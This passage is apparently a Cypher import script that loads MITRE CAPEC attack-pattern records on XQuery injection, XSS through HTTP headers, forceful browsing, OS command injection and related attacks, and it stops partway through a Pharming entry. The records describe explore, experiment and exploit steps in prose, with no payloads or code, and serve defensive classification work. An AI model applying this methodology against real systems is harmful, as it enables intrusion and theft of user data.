MERGE (:CWE{id: 707});
CREATE (:ResourcesRequired{id: 278, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:AttackPattern{id: 84, name: "XQuery Injection", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 530, text: "<div level=\"0\">\n  <p class=\"text\">The XQL must execute unvalidated data</p>\n</div>"});
CREATE (:Submission{id: 598});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 592, summary: "OrderedDict([('Text', \"This attack utilizes XQuery to probe and attack server systems; in a similar manner that SQL Injection allows an attacker to exploit SQL calls to RDBMS, XQuery Injection uses improperly validated data that is passed to XQuery commands to traverse and execute commands that the XQuery routines have access to. XQuery injection can be used to enumerate elements on the victim's environment, inject commands to the local host, or execute queries to remote files and data sources.\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey the application for user-controllable inputs", description: "<div level=\"0\">\n  <p class=\"text\">Using a browser or an automated tool, an attacker follows all public links and actions on a web site. He records all the links, the forms, the resources accessed and all other potential entry-points for the web application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Inputs are used by the application or the browser (DOM)</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Using URL rewriting, parameters may be part of the URL path.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No parameters appear to be used on the current page. Even though none appear, the web application may still use them if they are provided.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of URLs, with their corresponding parameters (POST, GET, COOKIE, etc.) is created by the attacker."});
CREATE (:Outcome{id: 2, type: "Success", description: "A list of application user interface entry fields is created by the attacker."});
CREATE (:Outcome{id: 3, type: "Success", description: "A list of resources accessed by the application is created by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Determine user-controllable input susceptible to injection", description: "<div level=\"0\">\n  <p class=\"text\">Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to XQL injection, attempt to inject characters that have special meaning in XQL. The goal is to create an XQL query with an invalid syntax.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use web browser to inject input through text fields or through HTTP GET parameters.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use XML files to inject input.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Use network-level packet injection tools such as netcat to inject input</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 5, description: "<div level=\"0\">\n  <p class=\"text\">Use modified client (modified by reverse engineering) to inject input.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives normal response from server.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives an error message from server indicating that there was a problem with the XQL query.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Server sends a specific error message that indicates programmatic parsing of the input data (e.g. NumberFormatException)</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "At least one user-controllable input susceptible to injection found."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No user-controllable input susceptible to injection found."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Information Disclosure", description: "<div level=\"0\">\n  <p class=\"text\">The attacker crafts and injects an XQuery payload which is acted on by an XQL query leading to inappropriate disclosure of information.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Leveraging one of the vulnerable inputs identified during the Experiment phase, inject malicious XQuery payload. The payload aims to get information on the structure of the underlying XML database and/or the content in it.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gets information from the XML database."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Manipulate the data in the XML database", description: "<div level=\"0\">\n  <p class=\"text\">The attacker crafts and injects an XQuery payload which is acted on by an XQL query leading to modification of application data.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Leveraging one of the vulnerable inputs identified during the Experiment phase, inject malicious XQuery payload.. The payload tries to insert or replace data in the XML database.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gets the XQuery engine to insert or modify data in the database. This is mainly used to either insert wrong data or to insert persistent attack payloads (XSS for instance) that will be sent to other users' browser."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 713});
MERGE (:CWE{id: 707});
CREATE (:AttackPattern{id: 85, name: "AJAX Fingerprinting", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 531, text: "<div level=\"0\">\n  <p class=\"text\">The user must allow JavaScript to execute in their browser</p>\n</div>"});
CREATE (:Submission{id: 599});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 593, summary: "OrderedDict([('Text', ['This attack utilizes the frequent client-server roundtrips in Ajax conversation to scan a system. While Ajax does not open up new vulnerabilities per se, it does optimize them from an attacker point of view. In many XSS attacks the attacker must get a \"hole in one\" and successfully exploit the vulnerability on the victim side the first time, once the client is redirected the attacker has many chances to engage in follow on probes, but there is only one first chance. In a widely used web application this is not a major problem because 1 in a 1,000 is good enough in a widely used application.', 'A common first step for an attacker is to footprint the environment to understand what attacks will work. Since footprinting relies on enumeration, the conversational pattern of rapid, multiple requests and responses that are typical in Ajax applications enable an attacker to look for many vulnerabilities, well-known ports, network locations and so on.'])])"});
MERGE (:Reference{local_id: "R.85.1", author: "Shreeraj Shah", title: "Ajax fingerprinting for Web 2.0 Applications", link: "http://www.net-security.org/dl/articles/Ajax_fingerprinting.pdf"});
MERGE (:CWE{id: 79});
MERGE (:CWE{id: 113});
MERGE (:CWE{id: 348});
MERGE (:CWE{id: 96});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 116});
MERGE (:CWE{id: 184});
MERGE (:CWE{id: 86});
MERGE (:CWE{id: 712});
MERGE (:CWE{id: 692});
CREATE (:AttackPattern{id: 86, name: "XSS Through HTTP Headers", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 532, text: "<div level=\"0\">\n  <p class=\"text\">Target software must be a client that allows scripting communication from remote hosts.</p>\n</div>"});
CREATE (:Submission{id: 600});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 367});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Related_Weaknesses, Resources_Required"});
CREATE (:PreviousEntryName{id: 101, name: "Embedding Script (XSS) in HTTP Headers"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 594, summary: "OrderedDict([('Text', 'An adversary exploits web applications that generate web content, such as links in a HTML page, based on unvalidated or improperly validated data submitted by other actors. XSS in HTTP Headers attacks target the HTTP headers which are hidden from most users and may not be validated by web applications.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Spider", description: "<div level=\"0\">\n  <p class=\"text\">Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the entry points (input) that becomes part of generated HTTP header (not only GET/POST/COOKIE, but also Content-Type, etc.)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters used in the HTTP headers.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Look for HTML meta tags that could be injectable</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record all links visited during a manual traversal of the web application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Web content is generated by the application and served to the browser based on user-controllable inputs.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">HTTP header variables are used by the application or the browser (DOM)</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">No HTTP variables appear to be used on the current page. Even though none appear, the web application may still use them if they are provided.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of URLs, with their corresponding HTTP variables is created by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Probe identified potential entry points for XSS vulnerability", description: "<div level=\"0\">\n  <p class=\"text\">The attacker uses the entry points gathered in the \"Explore\" phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited. He records all the responses from the server that include unmodified versions of his script.</p>\n  <p class=\"text\">The attacker tries also to inject extra-parameter to the HTTP request to see if they are reflected back in the web page or in the HTTP response.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Manually inject various script payloads into each identified entry point using a list of common script injection probes and observe system behavior to determine if script was executed.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes and observe system behavior to determine if script was executed.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record results of manual input of XSS probes in known URLs.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">User-controllable input is embedded as part of generated HTTP headers</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Input parameters become part of the web page (even in meta tags)</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Output to the browser is not encoded to remove executable scripting syntax.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Nothing is returned to the web page. It may be a stored XSS. The unique identifier from the probe helps to trace the flow of the possible XSS.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker's cross-site scripting string is repeated back verbatim at some point in the web site (if not on the same page). Note that sometimes, the payload might be well encoded in the page, but wouldn't be encoded at all in some other section of the same web page (title, script, etc.)"});
CREATE (:Outcome{id: 2, type: "Failure", description: "All HTML-sensitive characters are consistently re-encoded before being sent to the web browser."});
CREATE (:Outcome{id: 3, type: "Inconclusive", description: "Some sensitive characters are consistently encoded, but others are not."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Steal session IDs, credentials, page content, etc.", description: "<div level=\"0\">\n  <p class=\"text\">As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gets the user's cookies or other session identifiers."});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker gets the content of the page the user is viewing."});
CREATE (:Outcome{id: 3, type: "Success", description: "The attacker causes the user's browser to visit a page with malicious content."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Forceful browsing", description: "<div level=\"0\">\n  <p class=\"text\">When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker indirectly controls the user's browser and makes it performing actions exploiting CSRF."});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker manipulates the browser through the steps that he designed in his attack. The user, identified on a website, is now performing actions he is not aware of."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
CREATE (:AttackStep{id: 3, title: "Content spoofing", description: "<div level=\"0\">\n  <p class=\"text\">By manipulating the content, the attacker targets the information that the user would like to get from the website.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The user sees a page containing wrong information"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
MERGE (:Reference{id: "REF-2", local_id: "R.86.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-9", local_id: "R.86.2", title: "OWASP Cheatsheets", section: "XSS Filter Evasion Cheat Sheet", publisher: "The Open Web Application Security Project (OWASP)", link: "http://ha.ckers.org/xss.html"});
MERGE (:Reference{local_id: "R.86.3", author: "Watchfire Research", title: "XSS vulnerabilities in Google.com", pubdate: "Dec 21 2005", link: "http://seclists.org/fulldisclosure/2005/Dec/1107"});
CREATE (:CVE{id: "CVE-2006-5442", description: "<div level=\"0\">\n  <p class=\"text\">ViewVC 1.0.2 and earlier does not specify a charset in its HTTP headers or HTML documents, which allows remote attackers to conduct cross-site scripting (XSS) attacks that inject arbitrary UTF-7 encoded JavaScript code via a view.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2006-3918", description: "<div level=\"0\">\n  <p class=\"text\">http_protocol.c in (1) IBM HTTP Server 6.0 before 6.0.2.13 and 6.1 before 6.1.0.1, and (2) Apache HTTP Server 1.3 before 1.3.35, 2.0 before 2.0.58, and 2.2 before 2.2.2, does not sanitize the Expect header from an HTTP request when it is reflected back in an error message, which might allow cross-site scripting (XSS) style attacks using web client components that can send arbitrary headers in requests, as demonstrated using a Flash SWF file.</p>\n</div>"});
MERGE (:CWE{id: 80});
CREATE (:ResourcesRequired{id: 281, text: "<div level=\"0\">\n  <p class=\"text\">The adversary must have the ability to deploy a custom hostile service for access by targeted clients and the abbility to communicate synchronously or asynchronously with client machine. The adversary must also control a remote site of some sort to redirect client and data to.</p>\n</div>"});
CREATE (:AttackPattern{id: 87, name: "Forceful Browsing", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 533, text: "<div level=\"0\">\n  <p class=\"text\">The forcibly browseable pages or accessible resources must be discoverable and improperly protected.</p>\n</div>"});
CREATE (:Submission{id: 601});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 368});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 595, summary: "OrderedDict([('Text', ['An attacker employs forceful browsing to access portions of a website that are otherwise unreachable through direct URL entry.', 'Usually, a front controller or similar design pattern is employed to protect access to portions of a web application.', 'Forceful browsing enables an attacker to access information, perform privileged operations and otherwise reach sections of the web application that have been improperly protected.'])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Spider", description: "<div level=\"0\">\n  <p class=\"text\">Using an automated tool, an attacker follows all public links on a web site. He records all the links he finds.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a spidering tool to follow and record all links</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record all links visited during a manual traversal of the web application.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A list of links is created by the attacker."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Attempt well-known or guessable resource locations", description: "<div level=\"0\">\n  <p class=\"text\">Using an automated tool, an attacker requests a variety of well-known URLs that correspond to administrative, debugging, or other useful internal actions. He records all the positive responses from the server.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use a spidering tool to follow and record attempts on well-known URLs</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a proxy tool to record all links visited during a manual traversal of attempts on well-known URLs.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Common resource identifiers are used (e.g., /admin/, admin.jsp, admin.aspx, etc.)</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Well-known middleware or application platforms are used (e.g., Cold Fusion, WebSphere, WebLogic, JBoss, etc.)</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker discovers one or more unprotected resources."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Corrective"});
CREATE (:SecurityControl{id: 5, type: "Detective"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Use unauthorized resources", description: "<div level=\"0\">\n  <p class=\"text\">By visiting the unprotected resource, the attacker makes use of unauthorized functionality.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Access unprotected functions and execute them.</p>\n</div>"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:AttackStep{id: 2, title: "View unauthorized data", description: "<div level=\"0\">\n  <p class=\"text\">The attacker discovers and views unprotected sensitive data.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Direct request of protected pages that directly access database back-ends. (e.g., list.jsp, accounts.jsp, status.jsp, etc.)</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Dynamic pages (JSP, ASP, PHP, etc.) exist that divulge sensitive data without first checking authorization.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2007-1156", description: "<div level=\"0\">\n  <p class=\"text\">JBrowser allows remote attackers to bypass authentication and access certain administrative capabilities via a direct request for _admin/.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2007-1062", description: "<div level=\"0\">\n  <p class=\"text\">The Cisco Unified IP Conference Station 7935 3.2(15) and earlier, and Station 7936 3.3(12) and earlier does not properly handle administrator HTTP sessions, which allows remote attackers to bypass authentication controls via a direct URL request to the administrative HTTP interface for a limited time</p>\n</div>"});
MERGE (:CWE{id: 425});
MERGE (:CWE{id: 285});
MERGE (:CWE{id: 693});
CREATE (:ResourcesRequired{id: 282, text: "<div level=\"0\">\n  <p class=\"text\">A directory listing is helpful but not a requirement. No special resources are required.</p>\n</div>"});
CREATE (:AttackPattern{id: 88, name: "OS Command Injection", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 534, text: "<div level=\"0\">\n  <p class=\"text\">User controllable input used as part of commands to the underlying operating system.</p>\n</div>"});
CREATE (:Submission{id: 602});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 596, summary: "OrderedDict([('Text', 'In this type of an attack, an adversary injects operating system commands into existing application functions. An application that uses untrusted input to build command strings is vulnerable. An adversary can leverage OS command injection in an application to elevate privileges, execute arbitrary commands and compromise the underlying operating system.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Identify inputs for OS commands", description: "<div level=\"0\">\n  <p class=\"text\">The attacker determines user controllable input that gets passed as part of a command to the underlying operating system.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, he attempts to guess the actual operating system.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Induce errors to find informative error messages</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The target software accepts connections via the network.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Operating environment (operating system, language, and/or middleware) is correctly identified."});
CREATE (:Outcome{id: 2, type: "Inconclusive", description: "Multiple candidate operating environments are suggested."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Detective"});
CREATE (:AttackStep{id: 2, title: "Survey the Application", description: "<div level=\"0\">\n  <p class=\"text\">The attacker surveys the target application, possibly as a valid and authenticated user</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Spidering web sites for all available links</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Inventory all application inputs</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Attacker develops a list of valid inputs</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker develops a list of likely command delimiters."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Detective"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Vary inputs, looking for malicious results.", description: "<div level=\"0\">\n  <p class=\"text\">Depending on whether the application being exploited is a remote or local one the attacker crafts the appropriate malicious input, containing OS commands, to be passed to the application</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Inject command delimiters using network packet injection tools (netcat, nemesis, etc.)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Inject command delimiters using web test frameworks (proxies, TamperData, custom programs, etc.)</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Inventorying in prior step is successful.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "One or more injections that are appropriate to the platform provokes an unexpected response from the software, which can be varied by the attacker based on the input."});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Execute malicious commands", description: "<div level=\"0\">\n  <p class=\"text\">The attacker may steal information, install a back door access mechanism, elevate privileges or compromise the system in some other way.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker executes a command that stores sensitive information into a location where he can retrieve it later (perhaps using a different command injection).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker executes a command that stores sensitive information into a location where he can retrieve it later (perhaps using a different command injection).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">The attacker executes a command that stores sensitive information into a location where he can retrieve it later (perhaps using a different command injection).</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The software performs an action the attacker desires. This might be displaying information, storing a program, executing a command, or some other malicious activity."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
MERGE (:Reference{local_id: "R.88.1", title: "Secunia Advisory SA16869: Firefox Command Line URL Shell Command Injection", publisher: "Secunia", pubdate: "September 20, 2005", link: "http://secunia.com/advisories/16869/"});
MERGE (:CWE{id: 78});
MERGE (:CWE{id: 88});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 713});
CREATE (:AttackPattern{id: 89, name: "Pharming", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 535, text: "<div level=\"0\">\n  <p class=\"text\">Vulnerable DNS software or improperly protected hosts file or router that can be poisoned</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 536, text: "<div level=\"0\">\n  <p class=\"text\">A website that handles sensitive information but does not use a secure connection and a certificate that is valid is also prone to pharming</p>\n</div>"});
CREATE (:Submission{id: 603});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
